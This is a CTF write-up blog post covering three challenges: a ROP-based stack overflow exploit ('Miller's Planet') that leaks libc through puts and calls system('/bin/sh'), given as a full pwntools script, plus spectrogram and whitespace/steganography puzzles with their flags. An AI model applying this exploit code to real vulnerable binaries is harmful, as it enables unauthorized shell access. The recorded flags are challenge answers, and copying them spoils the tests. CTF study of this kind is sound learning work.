+++
date = '2026-02-28'
draft = false
title = 'UVT'
ShowToc = true
tags = ["ctf"]
+++


## Miller's Planet

Pretty fun challenge, even if I spent way too much time debugging myself with it. It's a pretty straightforward binary, first drawing an ASCII of a planet and printing some text, and then moving into a function I'm going to be calling vuln.

![challenge-screenshot](vuln.png#center)

Seems simple enough, we have an if branch allowing us to overflow either the stack or the heap based on our input stored in `v1`. (Thankfully no heap was necessary for this challenge). We don't even have PIE to hassle with, and also only partial RelRo, so we could technically overwrite the GOT. 

There even is a function calling `system('echo something')` which gives us a couple of system gadgets and also includes system's plt in our binary.

But there's a catch of course, we have extremely limited gadgets for the ROP chain. In total 136 unique and I went over *all of them* multiple times. Almost no `rdi` gadgets at all, except for a couple `mov rdi, rax; call system/puts/printf`.

![challenge-screenshot](gadgt.png#center)

*(Here, `0x50b0` is puts' plt and `0x50c0` is system's plt.)*

The most interesting gadget we have at our disposal is the previously mentioned `mov rdi, rax; call` one. When the vuln calls gets, its return value is given in `rax`. And since gets' return value is a pointer to the buffer we write into, that's what `rax` would become: the stack location of `v2` (so a stack pointer to its value).

My original idea was forming a payload starting with `"/bin/sh\x00\x00"`, causing `rax` to become a /bin/sh pointer, exactly what system needs as its parameter - then using the `mov rdi, rax; call system` gadget. Debugging with gef, things were looking great:

![challenge-screenshot](happen.png#center)

But this would spawn a shell which would instantly detach from the process. I assumed it had something to do with alignment so I fiddled with some other gadget chains, but that didn't change much. 

I did however manage to make it work *locally* by sending a payload that looked like `b"/bin/sh\x00"*35 + p64(gadget)`, but sadly that didn't work remotely, even with different padding.

![challenge-screenshot](wtf.png#center)

However, we *do* have another /bin/sh available, the one in libc. So we need a leak. Calling `puts(stack_offset)` would be pretty nice here, and luckily we have just the gadget for that: `rdi <- rax <- stack address; call puts(rdi);`!

After the leak is successfully printed, we just extract a random libc value from the dump and we can *finally* use one of `libc.so.6`'s `pop rdi; ret` gadgets. We already have the system plt so no need to calculate that ourselves. Here is the full script and the flag:

```python
from pwn import *

elf = ELF('./miller')

if args.REMOTE:
    p = remote('194.102.62.175', 22637)
else:
    p = elf.process()

gets_got   = 0x405020
system_plt = 0x4010c0
bss        = 0x405050
vuln       = 0x4013a0
ret        = 0x40101a
lea_gadget = 0x401450
mov_rdi_rax_system = 0x401249
leave_ret = 0x401238
mov_rdi_rax_puts = 0x401395

payload1 = b"A" * 0x110
payload1 += b"A"*8   # rbp 
payload1 += p64(ret)
payload1 += p64(mov_rdi_rax_puts)    # leaked libc!!
payload1 += p64(ret)
payload1 += p64(vuln)

p.recvuntil(b"message\n")
p.sendline(b"100")
p.recvuntil(b"message\n")
p.sendline(payload1)

leak_data = p.recvuntil(b"message\n")
print("raw leak:", leak_data.hex())

# acum extragem de aici un leak random si ii scadem offsetul
        
io_file_jumps_leak = u64(leak_data[208:216])
print(f"iofilejumps is {hex(io_file_jumps_leak)}")

libc = io_file_jumps_leak - 0x217600
binsh = libc + 0x1d8678
libc_pop_rdi_ret = 0x02a3e5 + libc
# acum putem folosi libc gadgets finally

payload2 = b"A" * 0x110
payload2 += b"A"*8   # rbp
payload2 += p64(libc_pop_rdi_ret)
payload2 += p64(binsh) 
payload2 += p64(ret)
payload2 += p64(system_plt)

p.sendline(b"100")
p.recvuntil(b"message\n")
p.sendline(payload2)

p.interactive()
```

![challenge-screenshot](flag.png#center)

## Stellar

Here just running `sox frequencies.wav -n spectrogram` was enough, and we can extract the flag UVT{5t4rsh1p_3ch03s_fr0m_th3_0ut3r_v01d}.

## Where is everything?

In this challenge, we're provided with 3 files.

First, empty.js - the binary we get from replacing all the `\u200b` with `0`s and the `\u200c` with `1`s from VOIDPAYLOAD can be decoded into a password protected zip.

The empty.txt file however was populated only by spaces, tabs and newlines. First I thought about [whitespace](https://en.wikipedia.org/wiki/Whitespace_(programming_language)), but that didn't work, and I noticed that each line has exactly 8 characters. That made me think about binary again, so I replaced all the spaces with `0` and all the tabs with `1` and binary decoded that with the line feed delimiter.

![challenge-screenshot](bogd.png#center)

That gives us this message:
```txt
We found a white frame labeled EMPTY.

The real clue is in the faintest part of the signal, not the color you see,
but the last breath of it.

We only saw it when sampling the blue starlight... and not at every point.
A pattern. A cadence. Like taking every third heartbeat along the grid.

Once you recover the whisper from the image, it opens what the void is hiding.
```

Since *blue* starlight is mentioned, I used [Aperi'Solve](https://www.aperisolve.com/) for the image and looked at decompose for blue. But looking at the *Common password(s)* section in Aperi'Solve I saw `D4rKm47T3rrr` and thought I'd try that first with the zip, and it worked! We got a picture, and running `strings` on it gives us the flag, `UVT{N0th1nG_iS_3mp7y_1n_sP4c3}`.
